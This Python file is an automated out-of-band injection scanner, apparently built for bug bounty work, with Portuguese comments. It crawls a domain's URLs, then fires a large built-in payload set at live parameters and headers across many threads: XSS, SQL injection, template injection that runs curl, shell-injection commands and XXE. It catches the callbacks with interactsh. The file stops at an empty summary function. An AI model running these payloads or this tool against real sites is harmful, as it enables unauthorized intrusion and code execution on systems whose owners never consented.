#!/usr/bin/env python3
"""
OOB Scanner v2 - Bug Bounty Automation Tool
Uso EXCLUSIVO em programas de Bug Bounty com escopo autorizado.

Dependências Go:
  go install github.com/lc/gau/v2/cmd/gau@latest
  go install github.com/jaeles-project/gospider@latest
  go install github.com/tomnomnom/waybackurls@latest
  go install github.com/tomnomnom/gf@latest
  go install github.com/projectdiscovery/httpx/cmd/httpx@latest
  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

Dependências Python:
  pip install requests urllib3

Uso rápido:
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --categories xss ssrf --delay 1.5
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --skip-recon --threads 5
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --poll --monitor-time 900
"""

import argparse
import subprocess
import sys
import os
import time
import json
import logging
import signal
import threading
import queue
import hashlib
import urllib.parse
import secrets
import re
import shlex
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

# ── Tenta importar requests; avisa se não tiver ──────────────────────────────
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ─── Cores no terminal ────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    MAGENTA= "\033[95m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

    @staticmethod
    def strip(text: str) -> str:
        """Remove códigos ANSI — para gravar em arquivo."""
        return re.sub(r'\033\[[0-9;]*m', '', text)

def banner():
    print(f"""{C.CYAN}{C.BOLD}
 ██████╗  ██████╗ ██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔═══██╗██╔═══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██║   ██║██║   ██║██████╔╝    ███████╗██║     ███████║██╔██╗ ██║
██║   ██║██║   ██║██╔══██╗    ╚════██║██║     ██╔══██║██║╚██╗██║
╚██████╔╝╚██████╔╝██████╔╝    ███████║╚██████╗██║  ██║██║ ╚████║
 ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{C.RESET}{C.DIM}  OOB Scanner v2  |  Bug Bounty  |  Apenas em alvos autorizados{C.RESET}
""")

# ─── Logger duplo: cores no terminal, texto limpo em arquivo ─────────────────
class CleanFileHandler(logging.FileHandler):
    """Handler que remove ANSI antes de gravar no arquivo."""
    def emit(self, record):
        record.msg = C.strip(str(record.msg))
        super().emit(record)

_log_lock = threading.Lock()

def setup_logging(output_dir: Path) -> logging.Logger:
    logger = logging.getLogger("oob")
    logger.setLevel(logging.DEBUG)
    logger.handlers.clear()

    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s",
                            datefmt="%Y-%m-%d %H:%M:%S")

    fh = CleanFileHandler(output_dir / "oob_scanner.log", encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)

    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter("%(message)s"))

    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger

logger: logging.Logger = logging.getLogger("oob")  # preenchido em main()

def log(msg: str, color: str = C.RESET, level: str = "info"):
    with _log_lock:
        getattr(logger, level)(f"{color}{msg}{C.RESET}")

# ─── UID collision-free ──────────────────────────────────────────────────────
_uid_seen: set[str] = set()
_uid_lock = threading.Lock()

def unique_id(category: str, param: str) -> str:
    """
    Gera UID globalmente único:
      cat3 + timestamp_ms + 6 bytes aleatórios + param4
    Formato: xss-17480523102345-a3f9c2-srch   (≤ 40 chars)
    Colisão praticamente impossível mesmo com threads.
    """
    cat  = re.sub(r'[^a-z0-9]', '', category.lower())[:3]
    par  = re.sub(r'[^a-z0-9]', '', param.lower())[:4]
    ts   = str(int(time.time() * 1000))        # milissegundos
    rand = secrets.token_hex(3)                 # 6 chars hex

    uid = f"{cat}-{ts}-{rand}-{par}"

    with _uid_lock:
        # Garante unicidade mesmo em caso de corrida
        while uid in _uid_seen:
            uid = f"{cat}-{ts}-{secrets.token_hex(3)}-{par}"
        _uid_seen.add(uid)

    return uid

# ─── Execução segura de subprocessos ─────────────────────────────────────────
def run_cmd(args: list[str], output_file: Optional[Path] = None,
            timeout: int = 300, stdin_data: str = "") -> str:
    """
    Executa comando como lista de argumentos (sem shell=True).
    Evita injeção de comando via domínios com caracteres especiais.
    """
    log(f"  $ {' '.join(args)}", C.DIM, "debug")
    try:
        result = subprocess.run(
            args,
            input=stdin_data or None,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        out = result.stdout.strip()
        if output_file and out:
            output_file.write_text(out, encoding="utf-8")
        if result.returncode not in (0, 1) and result.stderr:
            log(f"  stderr: {result.stderr[:200]}", C.DIM, "debug")
        return out
    except subprocess.TimeoutExpired:
        log(f"Timeout ({timeout}s): {args[0]}", C.YELLOW, "warning")
        return ""
    except FileNotFoundError:
        log(f"Ferramenta não encontrada: {args[0]}", C.RED, "error")
        return ""
    except Exception as e:
        log(f"Erro em '{args[0]}': {e}", C.RED, "error")
        return ""

def run_shell(cmd: str, output_file: Optional[Path] = None,
              timeout: int = 300) -> str:
    """
    Versão shell=True para pipes complexos (cat | gf | sort).
    Usar APENAS com strings construídas internamente (sem input do usuário).
    """
    log(f"  $ {cmd}", C.DIM, "debug")
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        out = result.stdout.strip()
        if output_file and out:
            output_file.write_text(out, encoding="utf-8")
        return out
    except subprocess.TimeoutExpired:
        log(f"Timeout ({timeout}s): {cmd[:60]}", C.YELLOW, "warning")
        return ""
    except Exception as e:
        log(f"Erro: {e}", C.RED, "error")
        return ""

def check_tool(tool: str) -> bool:
    return subprocess.run(["which", tool], capture_output=True).returncode == 0

def check_dependencies(tools: list[str]) -> bool:
    missing = [t for t in tools if not check_tool(t)]
    if missing:
        log(f"Ferramentas ausentes: {', '.join(missing)}", C.RED, "error")
        log("Instale com Go conforme README.", C.YELLOW)
        return False
    log(f"Dependências OK: {', '.join(tools)}", C.GREEN)
    return True

# ─── Fase 1: Reconhecimento ──────────────────────────────────────────────────
def phase_recon(domain: str, out: Path) -> Path:
    log("\n━━━ FASE 1: Reconhecimento ━━━", C.BLUE + C.BOLD)

    if not check_dependencies(["gau", "gospider", "waybackurls", "httpx"]):
        sys.exit(1)

    raw_dir = out / "raw"
    raw_dir.mkdir(exist_ok=True)

    # ── gau ───────────────────────────────────────────────────────────────────
    log("→ gau...", C.CYAN)
    run_cmd(["gau", "--threads", "5", "--blacklist", "png,jpg,gif,svg,css,woff",
             domain], raw_dir / "gau.txt", timeout=300)

    # ── gospider ──────────────────────────────────────────────────────────────
    log("→ gospider...", C.CYAN)
    gs_raw = raw_dir / "gospider_raw"
    gs_raw.mkdir(exist_ok=True)
    run_cmd(["gospider", "-s", f"https://{domain}", "-d", "3", "-t", "10",
             "--quiet", "-o", str(gs_raw)], timeout=180)
    gs_file = raw_dir / "gospider.txt"
    run_shell(
        f"find {shlex.quote(str(gs_raw))} -type f | xargs cat 2>/dev/null "
        f"| grep -oP 'https?://[^\"\\s]+' | sort -u",
        gs_file
    )

    # ── waybackurls ───────────────────────────────────────────────────────────
    log("→ waybackurls...", C.CYAN)
    run_cmd(["waybackurls", domain], raw_dir / "waybackurls.txt", timeout=300)

    # ── Unifica + deduplica ───────────────────────────────────────────────────
    all_urls_file = out / "all_urls.txt"
    all_urls: set[str] = set()
    for f in raw_dir.glob("*.txt"):
        try:
            for line in f.read_text(encoding="utf-8", errors="ignore").splitlines():
                line = line.strip()
                # Descarta extensões estáticas e URLs vazias
                if line and not re.search(
                    r'\.(png|jpg|jpeg|gif|svg|ico|css|woff|woff2|ttf|eot|mp4|mp3|pdf)(\?|$)',
                    line, re.I
                ):
                    all_urls.add(line)
        except Exception:
            pass

    all_urls_file.write_text("\n".join(sorted(all_urls)), encoding="utf-8")
    log(f"  URLs brutas (deduplicadas): {len(all_urls)}", C.GREEN)

    # ── httpx: filtra endpoints vivos ────────────────────────────────────────
    log("→ httpx validando endpoints vivos...", C.CYAN)
    live_file = out / "live_urls.txt"
    run_cmd(
        ["httpx", "-l", str(all_urls_file), "-silent", "-threads", "50",
         "-timeout", "10", "-mc", "200,201,301,302,403,405"],
        live_file, timeout=600
    )

    live_count = len(live_file.read_text().splitlines()) if live_file.exists() else 0
    log(f"  Endpoints vivos: {live_count}", C.GREEN)
    return live_file

def phase_gf(live_urls_file: Path, out: Path) -> dict[str, Path]:
    log("\n━━━ Filtrando com gf ━━━", C.BLUE + C.BOLD)

    if not check_tool("gf"):
        log("gf não encontrado — pulando filtragem.", C.YELLOW, "warning")
        return {}

    gf_dir = out / "gf"
    gf_dir.mkdir(exist_ok=True)

    # Mapeia categoria → nome do padrão gf (alguns nomes diferem)
    categories = {
        "xss":      "xss",
        "sqli":     "sqli",
        "ssrf":     "ssrf",
        "ssti":     "ssti",
        "redirect": "redirect",
        "rce":      "rce",
        "lfi":      "lfi",
        "idor":     "idor",
        "xxe":      "xxe",
    }

    files: dict[str, Path] = {}
    for cat, gf_pattern in categories.items():
        out_file = gf_dir / f"gf_{cat}.txt"
        # Pipe: cat file | gf pattern
        result = run_shell(
            f"cat {shlex.quote(str(live_urls_file))} | gf {shlex.quote(gf_pattern)} 2>/dev/null"
        )
        if result:
            out_file.write_text(result, encoding="utf-8")
            count = len(result.splitlines())
            log(f"  [{cat.upper():8}] {count:4d} endpoints", C.GREEN)
            files[cat] = out_file
        else:
            log(f"  [{cat.upper():8}]    0 endpoints", C.DIM)

    return files

# ─── Fase 2: Payloads ────────────────────────────────────────────────────────
PAYLOADS: dict[str, list[str]] = {
    "xss": [
        '"><img src="https://{OOB}/{ID}" onerror=alert(1)>',
        "'><script src=https://{OOB}/{ID}></script>",
        '"><svg/onload=fetch(`https://{OOB}/{ID}`)>',
        '"><details open ontoggle=fetch(`https://{OOB}/{ID}`)>',
        # DOM-based — útil quando param vai para innerHTML
        "javascript:fetch('https://{OOB}/{ID}')//?",
    ],
    "sqli": [
        # MySQL out-of-band via LOAD_FILE (UNC path)
        "' AND 1=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,'{OOB}',0x5c5c,'{ID}'))-- -",
        # MSSQL via xp_dirtree
        "'; EXEC master..xp_dirtree '\\\\{OOB}\\{ID}';-- -",
        # PostgreSQL via COPY
        "'; COPY (SELECT '') TO PROGRAM 'nslookup {OOB}';-- -",
        # Oracle via UTL_HTTP
        "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{OOB}/{ID}') FROM dual)-- -",
        # Blind time + OOB combo (MySQL)
        "' AND SLEEP(0) AND 1=(SELECT 1 FROM (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{OOB}',0x5c5c,'{ID}')))x)-- -",
    ],
    "ssrf": [
        "https://{OOB}/{ID}",
        "http://{OOB}/{ID}",
        # Bypass comuns
        "http://[::ffff:{OOB}]/{ID}",
        "http://{OOB}%2F{ID}",
        "dict://{OOB}:80/{ID}",
        "ftp://{OOB}/{ID}",
        "//\t{OOB}/{ID}",
    ],
    "ssti": [
        # Jinja2 / Python
        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{OOB}/{ID}'],stdout=-1).communicate()}}",
        # Freemarker (Java)
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl https://{OOB}/{ID}")}',
        # Pebble (Java)
        "{% set cmd = 'curl https://{OOB}/{ID}' %}{{ cmd }}",
        # Twig (PHP)
        "{{['curl https://{OOB}/{ID}']|filter('system')}}",
        # ERB (Ruby)
        "<%= `curl https://{OOB}/{ID}` %>",
        # Velocity (Java)
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('curl https://{OOB}/{ID}'))",
    ],
    "redirect": [
        "https://{OOB}/{ID}",
        "//https://{OOB}/{ID}",
        "//{OOB}/{ID}",
        # Bypasses de validação
        "https://{OOB}%2F{ID}",
        "https:/%5C%5C{OOB}/{ID}",
        "https://{OOB};@legit.com/{ID}",
        "@{OOB}/{ID}",
    ],
    "rce": [
        # Shell injection em diferentes contextos
        "; curl https://{OOB}/{ID} #",
        "| curl https://{OOB}/{ID}",
        "`curl https://{OOB}/{ID}`",
        "$(curl https://{OOB}/{ID})",
        # Encoded
        "%3B+curl+https%3A%2F%2F{OOB}%2F{ID}",
        # Newline injection
        "\ncurl https://{OOB}/{ID}\n",
        # PowerShell (targets Windows)
        "; Invoke-WebRequest https://{OOB}/{ID} #",
    ],
    "lfi": [
        # Wrapper PHP + OOB
        "php://filter/convert.base64-encode/resource=https://{OOB}/{ID}",
        # Bypass null byte
        "../../etc/passwd%00https://{OOB}/{ID}",
        # Wrapper expect
        "expect://curl https://{OOB}/{ID}",
        # input://
        "php://input",  # payload vai no body
    ],
    "xxe": [
        # Standard HTTP OOB
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://{OOB}/{ID}">]><r>&x;</r>',
        # Parâmetro entity (blind XXE)
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % oob SYSTEM "https://{OOB}/{ID}">%oob;]>',
        # SVG XXE
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://{OOB}/{ID}"/></svg>',
    ],
    "ssrf_header": [],  # preenchido dinamicamente
    "idor": [
        # IDOR com SSRF embutido
        "https://{OOB}/{ID}",
    ],
}

# Cabeçalhos HTTP para injeção de OOB (SSRF via header)
OOB_HEADERS: list[tuple[str, str]] = [
    ("X-Forwarded-For",          "https://{OOB}/{ID}"),
    ("X-Real-IP",                "{OOB}"),
    ("Referer",                  "https://{OOB}/{ID}"),
    ("X-Forwarded-Host",         "{OOB}"),
    ("X-Original-URL",           "https://{OOB}/{ID}"),
    ("X-Custom-IP-Authorization","{OOB}"),
    ("X-Originating-IP",         "{OOB}"),
    ("True-Client-IP",           "{OOB}"),
    ("CF-Connecting-IP",         "{OOB}"),
    ("X-Host",                   "{OOB}"),
    ("Forwarded",                "for={OOB};by={OOB}"),
]

# ─── PayloadLog — O(1) lookup por uid ────────────────────────────────────────
class PayloadLog:
    def __init__(self, log_file: Path):
        self.log_file = log_file
        self._by_uid: dict[str, dict] = {}   # lookup O(1)
        self._all:    list[dict]      = []
        self._lock    = threading.Lock()

    @property
    def entries(self) -> list[dict]:
        with self._lock:
            return list(self._all)

    def record(self, uid: str, url: str, param: str,
               category: str, payload: str) -> dict:
        entry = {
            "uid":       uid,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "unix_ts":   int(time.time() * 1000),   # milissegundos
            "category":  category,
            "url":       url,
            "param":     param,
            "payload":   payload,
        }
        with self._lock:
            self._by_uid[uid] = entry
            self._all.append(entry)
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
        return entry

    def find_by_uid(self, uid: str) -> Optional[dict]:
        """O(1) — dicionário indexado por uid."""
        with self._lock:
            return self._by_uid.get(uid)

    def find_fuzzy(self, raw_id: str) -> Optional[dict]:
        """Busca por substring no raw_id do interactsh."""
        with self._lock:
            for uid, entry in self._by_uid.items():
                if uid in raw_id:
                    return entry
        return None

# ─── HTTP com session pooling ─────────────────────────────────────────────────
def make_session(proxy: str = "") -> "requests.Session":
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=20,
        pool_maxsize=50,
        max_retries=0,
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

def send_payload(session, url: str, headers: dict,
                 timeout: int = 8) -> str:
    """Envia GET com payload e retorna HTTP status code."""
    if not HAS_REQUESTS:
        # Fallback: curl como subprocesso seguro
        h_args = []
        for k, v in headers.items():
            h_args += ["-H", f"{k}: {v}"]
        result = run_cmd(
            ["curl", "-sk", "--max-time", str(timeout),
             "-o", "/dev/null", "-w", "%{http_code}",
             *h_args, url],
            timeout=timeout + 5
        )
        return result.strip()
    try:
        r = session.get(url, headers=headers, timeout=timeout,
                        verify=False, allow_redirects=False)
        return str(r.status_code)
    except requests.exceptions.Timeout:
        return "TMO"
    except requests.exceptions.ConnectionError:
        return "ERR"
    except Exception:
        return "???"

# ─── Extração de parâmetros ───────────────────────────────────────────────────
def extract_params(url: str) -> list[str]:
    """Retorna lista de nomes de parâmetros da query string."""
    try:
        parsed = urllib.parse.urlparse(url)
        return list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())
    except Exception:
        return []

def inject_param(url: str, param: str, value: str) -> str:
    """Substitui o valor de um parâmetro específico na URL."""
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_qs = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_qs))
    except Exception:
        return url

# ─── Fase 2: Injeção (multi-thread + monitor em paralelo) ────────────────────
def _inject_one(task: dict, session, plog: PayloadLog, oob_host: str,
                proxy: str) -> dict:
    """
    Executa um único task de injeção. Retornado para o executor.
    task = { url, param, category, payload_template }
    """
    uid     = unique_id(task["category"], task["param"])
    payload = (task["payload_template"]
               .replace("{OOB}", oob_host)
               .replace("{ID}", uid))

    if task["param"] == "__header__":
        # Injeção via cabeçalho HTTP
        injected_url = task["url"]
        hdr_name     = task["header_name"]
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            hdr_name: payload,
        }
    else:
        injected_url = inject_param(task["url"], task["param"], payload)
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "X-Forwarded-For": f"{oob_host}",
        }

    sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")   # HH:MM:SS UTC
    plog.record(uid, task["url"], task["param"], task["category"], payload)
    code = send_payload(session, injected_url, headers)

    return {
        "uid":      uid,
        "sent_at":  sent_at,   # horário exato do envio — para cruzar com interactsh
        "category": task["category"],
        "param":    task["param"],
        "url":      task["url"][:70],
        "code":     code,
    }

def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
                 plog: PayloadLog, delay: float, threads: int,
                 proxy: str = "") -> int:
    log("\n━━━ FASE 2: Injeção de Payloads OOB ━━━", C.BLUE + C.BOLD)

    if not HAS_REQUESTS:
        log("requests não instalado — usando curl como fallback (mais lento).", C.YELLOW, "warning")

    # Monta fila de tasks
    tasks: list[dict] = []
    for category, gf_file in category_files.items():
        if category not in PAYLOADS or not gf_file.exists():
            continue
        urls = [u.strip() for u in gf_file.read_text().splitlines() if u.strip()]
        # Deduplica URLs dentro da categoria
        urls = list(dict.fromkeys(urls))

        for url in urls:
            params = extract_params(url)
            if not params:
                params = ["__path__"]

            for param in params:
                for tpl in PAYLOADS[category]:
                    tasks.append({
                        "url": url, "param": param,
                        "category": category, "payload_template": tpl,
                    })

            # Injeção via headers para categorias sensíveis
            if category in ("ssrf", "rce", "lfi", "xxe"):
                for hdr_name, hdr_tpl in OOB_HEADERS:
                    tasks.append({
                        "url": url, "param": "__header__",
                        "category": f"{category}_hdr",
                        "payload_template": hdr_tpl,
                        "header_name": hdr_name,
                    })

    total = len(tasks)
    log(f"  Tasks geradas: {total} "
        f"({len(category_files)} categorias, {threads} threads)", C.CYAN)

    if total == 0:
        log("  Nenhuma task — verifique se os arquivos gf têm conteúdo.", C.YELLOW, "warning")
        return 0

    results_file = out / "injection_results.jsonl"
    sent = 0
    errors = 0

    # Cria sessions por thread via threading.local
    _local = threading.local()

    def get_session():
        if not hasattr(_local, "session"):
            _local.session = make_session(proxy) if HAS_REQUESTS else None
        return _local.session

    def worker(task):
        time.sleep(delay)  # respeita delay por thread
        return _inject_one(task, get_session(), plog, oob_host, proxy)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(worker, t): t for t in tasks}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                sent += 1
                color = C.GREEN if res["code"] in ("200","201","301","302") else C.DIM
                log(f"  {res['sent_at']} [{res['uid'][:30]}] {res['param']:12} "
                    f"HTTP {res['code']} → {res['url']}", color)
                with open(results_file, "a", encoding="utf-8") as f:
                    f.write(json.dumps(res) + "\n")
            except Exception as e:
                errors += 1
                log(f"  Erro em task: {e}", C.RED, "warning")

    log(f"\n  Enviados: {sent} | Erros: {errors}", C.GREEN + C.BOLD)
    return sent

# ─── Fase 3: Monitoramento interactsh (thread separada) ──────────────────────
def phase_monitor(oob_host: str, plog: PayloadLog, out: Path,
                  duration: int = 300, parallel: bool = False):
    """
    Inicia o monitor.
    parallel=True → roda em thread separada (para injeção e monitor em simultâneo).
    """
    if parallel:
        t = threading.Thread(
            target=_monitor_loop,
            args=(oob_host, plog, out, duration),
            daemon=True,
            name="monitor",
        )
        t.start()
        return t
    else:
        _monitor_loop(oob_host, plog, out, duration)
        return None

def _monitor_loop(oob_host: str, plog: PayloadLog,
                  out: Path, duration: int):
    log("\n━━━ FASE 3: Monitorando OOB callbacks ━━━", C.BLUE + C.BOLD)
    log(f"  Host  : {oob_host}", C.CYAN)
    log(f"  Tempo : {duration}s  |  Ctrl+C para encerrar", C.DIM)

    hits_file    = out / "oob_hits.jsonl"
    summary_file = out / "oob_hits_summary.txt"

    if not check_tool("interactsh-client"):
        log("  interactsh-client não encontrado.", C.YELLOW, "warning")
        _manual_poll_hint(oob_host, out)
        return

    log("  Iniciando interactsh-client...", C.CYAN)

    # ── Notas sobre o interactsh-client v1.3+: ────────────────────────────
    # • Linhas [INF]/[WRN]/[ERR] vão para STDOUT (não só stderr)
    # • O JSON de cada hit também vai para STDOUT
    # • O campo "timestamp" já está no JSON do hit (RFC3339 com nanosegundos)
    # • Usar -server apenas quando o host não termina em oast.* (servidor público)
    # ──────────────────────────────────────────────────────────────────────
    cmd = ["interactsh-client", "-json", "-poll-interval", "5"]
    # Se o usuário informou um host customizado (não é o padrão interactsh)
    # usa -server. Para oast.fun / oast.me o cliente conecta por conta própria.
    if not re.search(r"oast\.(fun|me|live|online)", oob_host):
        cmd += ["-server", oob_host]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,          # line-buffered
    )

    # Thread que drena stderr — alguns builds ainda usam stderr para [INF]
    def drain_stderr():
        for raw in proc.stderr:
            raw = raw.strip()
            if not raw:
                continue
            # Mostra [INF] normalmente, destaca erros
            lvl  = "debug"
            color = C.DIM
            low  = raw.lower()
            if any(k in low for k in ("error", "failed", "invalid", "refused")):
                lvl   = "warning"
                color = C.YELLOW
            log(f"  [interactsh] {raw}", color, lvl)

    threading.Thread(target=drain_stderr, daemon=True, name="iactsh-stderr").start()

    # Contagem regressiva visível no terminal
    def _countdown():
        remaining = duration
        while remaining > 0 and proc.poll() is None:
            time.sleep(10)
            remaining -= 10
            if remaining > 0:
                log(f"  ⏱  {remaining}s restantes no monitor...", C.DIM)
    threading.Thread(target=_countdown, daemon=True, name="iactsh-timer").start()

    start  = time.time()
    hits: list[dict] = []

    try:
        while time.time() - start < duration:
            line = proc.stdout.readline()

            # Processo encerrou e não há mais output
            if not line:
                if proc.poll() is not None:
                    log("  interactsh-client encerrou inesperadamente.", C.RED, "error")
                    break
                time.sleep(0.3)
                continue

            line = line.strip()
            if not line:
                continue

            # ── v1.3+ mistura [INF]/[WRN]/[DBG] com JSON no stdout ────────
            # Filtra linhas que claramente não são JSON
            if line.startswith("["):
                # Pode ser [INF], [WRN], [ERR], [DBG] — exibe e continua
                low = line.lower()
                if any(k in low for k in ("error", "failed", "invalid")):
                    log(f"  ⚠ {line}", C.YELLOW, "warning")
                else:
                    log(f"  {line}", C.DIM, "debug")
                continue

            # Tenta parsear como JSON do hit
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                # Linha inesperada — loga em debug e segue
                log(f"  [stdout não-JSON] {line[:120]}", C.DIM, "debug")
                continue

            # Só processa se tiver os campos esperados de um hit
            if "protocol" not in data and "unique-id" not in data:
                continue

            _process_hit(data, plog, hits, hits_file)

    except KeyboardInterrupt:
        log("\n  Monitor encerrado pelo usuário.", C.YELLOW)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    _write_summary(hits, plog, summary_file)

def _parse_interactsh_ts(ts_str: str) -> Optional[float]:
    """
    Converte o campo timestamp do interactsh (RFC3339 com nanosegundos)
    para float unix timestamp.
    Ex: "2026-05-25T15:33:20.106317855Z" → 1748183600.106317
    Python's fromisoformat não aceita nanosegundos — trunca para microssegundos.
    """
    if not ts_str:
        return None
    try:
        # Trunca nanosegundos para microssegundos (6 dígitos)
        ts_norm = re.sub(r'(\.\d{6})\d+(Z?)$', r'\1\2', ts_str)
        ts_norm = ts_norm.replace("Z", "+00:00")
        return datetime.fromisoformat(ts_norm).timestamp()
    except Exception:
        return None


def _process_hit(data: dict, plog: PayloadLog,
                 hits: list, hits_file: Path):
    """
    Processa um hit JSON do interactsh-client v1.3+.

    Campos relevantes no JSON real:
      protocol      : "dns" | "http" | "smtp" | ...
      unique-id     : ID base do host interactsh
      full-id       : ID completo (pode incluir subpath do payload)
      q-type        : "A" | "AAAA" | "MX" ... (DNS)
      raw-request   : string com a requisição recebida
      remote-address: IP de quem fez a requisição OOB
      timestamp     : RFC3339 com nanosegundos — quando o hit chegou
    """
    raw_id      = data.get("full-id", data.get("unique-id", ""))
    protocol    = data.get("protocol", "unknown").upper()
    remote_addr = data.get("remote-address", "?")
    raw_request = data.get("raw-request", "")
    q_type      = data.get("q-type", "")          # só DNS

    # ── Timestamp: prefere o do JSON (preciso), fallback para now() ───────
    hit_ts_str  = data.get("timestamp", "")
    hit_ts_unix = _parse_interactsh_ts(hit_ts_str) or time.time()
    received_at = hit_ts_str or datetime.now(timezone.utc).isoformat()

    # Para DNS, exibe o tipo de query
    proto_label = f"{protocol}/{q_type}" if q_type else protocol

    log(f"\n{'━'*60}", C.RED + C.BOLD)
    log(f"  🎯  OOB HIT RECEBIDO!", C.RED + C.BOLD)
    log(f"  Protocolo  : {proto_label}",  C.YELLOW)
    log(f"  Remote IP  : {remote_addr}",  C.YELLOW)
    log(f"  Full-ID    : {raw_id}",       C.YELLOW)
    log(f"  Timestamp  : {received_at}",  C.YELLOW)

    # Mostra primeira linha da requisição (HTTP) ou query DNS
    if raw_request:
        first_line = raw_request.split("\n")[0].strip()
        if first_line:
            log(f"  Request    : {first_line[:120]}", C.YELLOW)

    # ── Correlação com payload enviado ────────────────────────────────────
    # find_fuzzy procura o UID embutido no subpath do full-id
    # Ex: full-id = "xss-17480523102345-a3f9c2-srch.abc.oast.fun"
    #     → encontra uid "xss-17480523102345-a3f9c2-srch" no payload_log
    matched = plog.find_fuzzy(raw_id)

    delay_str = "?"
    if matched:
        # Delay = timestamp do hit (do JSON) − unix_ts do payload (ms → s)
        sent_ts_unix = matched["unix_ts"] / 1000.0
        delay_s      = hit_ts_unix - sent_ts_unix
        # Delay negativo = hit chegou antes de registrar (improvável) ou clock skew
        if delay_s < 0:
            delay_str = f"~{abs(delay_s):.1f}s (clock skew?)"
        elif delay_s > 3600:
            delay_str = f"{delay_s/3600:.1f}h"
        elif delay_s > 60:
            delay_str = f"{delay_s/60:.1f}min"
        else:
            delay_str = f"{delay_s:.1f}s"

        log(f"\n  ✅ Payload correlacionado!", C.GREEN + C.BOLD)
        log(f"  Categoria  : {matched['category']}",         C.GREEN)
        log(f"  URL        : {matched['url']}",               C.GREEN)
        log(f"  Parâmetro  : {matched['param']}",             C.GREEN)
        log(f"  Enviado em : {matched['timestamp']}",         C.GREEN)
        log(f"  Hit em     : {received_at}",                  C.GREEN)
        log(f"  ⏱  Delay   : {delay_str} após envio",        C.GREEN + C.BOLD)
        log(f"  Payload    : {matched['payload'][:120]}",     C.GREEN)
    else:
        log("  ⚠  UID não encontrado no payload_log.", C.YELLOW, "warning")
        log("     Possíveis causas:", C.DIM)
        log("       • Hit de sessão anterior (use --poll para recarregar log)", C.DIM)
        log("       • DNS warmup do próprio interactsh (normal nos primeiros hits)", C.DIM)
        log("       • Payload enviado por outra ferramenta", C.DIM)
        log(f"     Buscar: grep '{raw_id[:24]}' {hits_file.parent}/payload_log.jsonl", C.DIM)

    hit = {
        "received_at":    received_at,
        "hit_ts_unix":    hit_ts_unix,
        "protocol":       proto_label,
        "remote_addr":    remote_addr,
        "raw_id":         raw_id,
        "delay_str":      delay_str,
        "raw_request":    raw_request[:500],
        "matched_entry":  matched,
    }
    hits.append(hit)
    with open(hits_file, "a", encoding="utf-8") as f:
        f.write(json.dumps(hit) + "\n")

    log(f"{'━'*60}\n", C.RED + C.BOLD)

def _manual_poll_hint(oob_host: str, out: Path):
    log("\n  ═══ MONITORAMENTO MANUAL ═══", C.YELLOW + C.BOLD)
    log(f"  1. Em outro terminal:", C.CYAN)
    log(f"     interactsh-client -server {oob_host} -json \\", C.DIM)
    log(f"       | tee {out}/interactsh_raw.jsonl", C.DIM)
    log(f"  2. Ao receber hit, extraia o 'unique-id' e cruze:", C.CYAN)
    log(f"     grep <uid> {out}/payload_log.jsonl", C.DIM)
    log(f"  3. O campo unix_ts (ms) mostra exatamente quando foi enviado.", C.DIM)

def _write_summary(hits: list, plog: PayloadLog, summary_file: Path):
